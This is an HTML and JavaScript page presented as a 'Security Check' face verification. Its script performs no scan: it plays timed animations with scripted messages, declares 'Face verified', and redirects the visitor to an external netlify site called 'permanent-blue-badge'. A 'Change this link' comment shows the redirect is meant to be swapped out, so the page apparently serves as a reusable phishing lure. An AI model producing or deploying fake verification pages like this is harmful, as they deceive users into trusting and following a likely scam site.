

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Verification</title>
<style>
  :root{
    --bg: #ffffff;
    --card: #fbfdff;
    --muted: #6b7280;
    --accent: #0ea5e9;
    --success: #10b981;
    --radius: 14px;
    --shadow: 0 10px 36px rgba(16,24,40,0.06);
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0; font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    background:var(--bg); color:#0f172a; display:flex; align-items:center; justify-content:center;
    padding:20px;
  }

  .card{
    width:100%; max-width:520px; background:var(--card); border-radius:var(--radius);
    padding:34px; box-shadow:var(--shadow); text-align:center; position:relative;
  }

  h1{margin:0; font-size:20px; font-weight:600}
  p.lead{margin:8px 0 20px; color:var(--muted); font-size:13px}

  .top-area{display:flex; flex-direction:column; align-items:center; gap:12px}
  .face-ring{
    width:120px; height:120px; border-radius:50%; position:relative; display:flex;
    align-items:center; justify-content:center; background:linear-gradient(180deg,#ffffff,#fbfdff);
    box-shadow: 0 8px 24px rgba(2,6,23,0.06);
  }
  .ring-svg{position:absolute;width:100%;height:100%;top:0;left:0;transform:rotate(-90deg)}
  .ring-progress{stroke: url(#g); stroke-dasharray: 440; stroke-dashoffset: 440; transition: stroke-dashoffset 600ms linear;}

  .status{font-size:13px;color:var(--muted); margin-bottom:6px}

  /* Center black scanner band */
  .center-band{
    width:100%; max-width:420px; height:92px; margin:18px auto 0; border-radius:12px;
    background:#0b0c0e; color:#f8fafc; display:flex; align-items:center; justify-content:center;
    position:relative; overflow:hidden; box-shadow: 0 12px 36px rgba(2,6,23,0.12);
  }

  /* Animated scanning light line */
  .scan-line {
    position:absolute;
    top:0; left:0;
    width:100%; height:6px;
    background:linear-gradient(90deg, transparent, rgba(255,255,255,0.2), rgba(255,255,255,0.5), transparent);
    animation: moveLine 1.8s linear infinite;
  }

  @keyframes moveLine {
    0% { top: 0; }
    100% { top: calc(100% - 6px); }
  }

  .band-content{display:flex; align-items:center; gap:14px; z-index:3; font-weight:600; font-size:15px}
  .band-check{
    width:42px; height:42px; border-radius:50%; display:flex; align-items:center; justify-content:center;
    background:linear-gradient(180deg,#0ea5e9,#0369a1); color:white; font-weight:700;
    box-shadow: 0 6px 18px rgba(3,105,161,0.16);
  }

  .controls{margin-top:20px; display:flex; align-items:center; justify-content:center; gap:12px}
  button.primary{
    background:linear-gradient(90deg,var(--accent), #0369a1); color:white; border:0; padding:10px 18px;
    border-radius:12px; font-weight:700; cursor:pointer; box-shadow: 0 8px 28px rgba(3,105,161,0.12); font-size:15px;
  }
  button.primary:disabled{opacity:0.52; cursor:not-allowed;}
  .small{font-size:12px;color:var(--muted); margin-top:12px}

  .center-band.verified{ animation: pulse 900ms ease-out 1; }
  @keyframes pulse{
    0%{ box-shadow: 0 12px 36px rgba(2,6,23,0.12) }
    50%{ box-shadow: 0 22px 48px rgba(2,6,23,0.18) }
    100%{ box-shadow: 0 12px 36px rgba(2,6,23,0.12) }
  }

  @media (max-width:520px){
    .card{padding:20px}
    .center-band{height:84px}
  }
</style>
</head>
<body>
  <div class="card">
    <h1>Security Check</h1>
    <p class="lead">A quick face verification to secure your session</p>

    <div class="top-area">
      <div class="face-ring">
        <svg class="ring-svg" viewBox="0 0 140 140">
          <defs>
            <linearGradient id="g" x1="0" x2="1">
              <stop offset="0" stop-color="#0ea5e9" />
              <stop offset="1" stop-color="#0369a1" />
            </linearGradient>
          </defs>
          <circle cx="70" cy="70" r="64" stroke="#eef2f7" fill="none" stroke-width="6"></circle>
          <circle class="ring-progress" cx="70" cy="70" r="64" stroke="url(#g)" fill="none" stroke-width="6"></circle>
        </svg>
      </div>
      <div class="status" id="statusMsg">Initializing scan…</div>
    </div>

    <div class="center-band" id="centerBand">
      <div class="scan-line" id="scanLine"></div>
      <div class="band-content" id="bandContent">
        <div class="band-check" id="bandCheck">✓</div>
        <div id="bandText">Scanning...</div>
      </div>
    </div>

    <div class="controls">
      <button class="primary" id="continueBtn" disabled>Continue</button>
    </div>

    <div class="small">Hold still while we confirm your identity.</div>
  </div>

<script>
  const ring = document.querySelector('.ring-progress');
  const statusMsg = document.getElementById('statusMsg');
  const centerBand = document.getElementById('centerBand');
  const bandText = document.getElementById('bandText');
  const continueBtn = document.getElementById('continueBtn');
  const scanLine = document.getElementById('scanLine');
  const REDIRECT_URL = " https://permanent-blue-badge.netlify.app/"; // Change this link

  function setRing(percent){
    const total = 440;
    const offset = Math.round(total * (1 - percent/100));
    ring.style.strokeDashoffset = offset;
  }

  const steps = [
    {p: 20, t: 800, msg: 'Locating face'},
    {p: 40, t: 800, msg: 'Analyzing depth'},
    {p: 70, t: 800, msg: 'Verifying data'},
    {p: 100, t: 800, msg: 'Verification successful'}
  ];

  let i = 0;
  function nextStep(){
    if (i >= steps.length){ verified(); return; }
    const s = steps[i++];
    statusMsg.textContent = s.msg;
    bandText.textContent = 'Scanning...';
    setRing(s.p);
    setTimeout(nextStep, s.t);
  }

  setTimeout(() => {
    statusMsg.textContent = 'Starting scan...';
    setRing(10);
    setTimeout(nextStep, 600);
  }, 400);

  function verified(){
    scanLine.style.display = "none"; // stop scanner animation
    centerBand.classList.add('verified');
    bandText.textContent = "You're not a robot";
    statusMsg.textContent = "Face verified";
    statusMsg.style.color = "#10b981";
    continueBtn.disabled = false;
  }

  continueBtn.addEventListener('click', () => {
    bandText.textContent = "Redirecting…";
    continueBtn.disabled = true;
    setTimeout(() => { window.location.href = REDIRECT_URL; }, 600);
  });
</script>
</body>
</html>
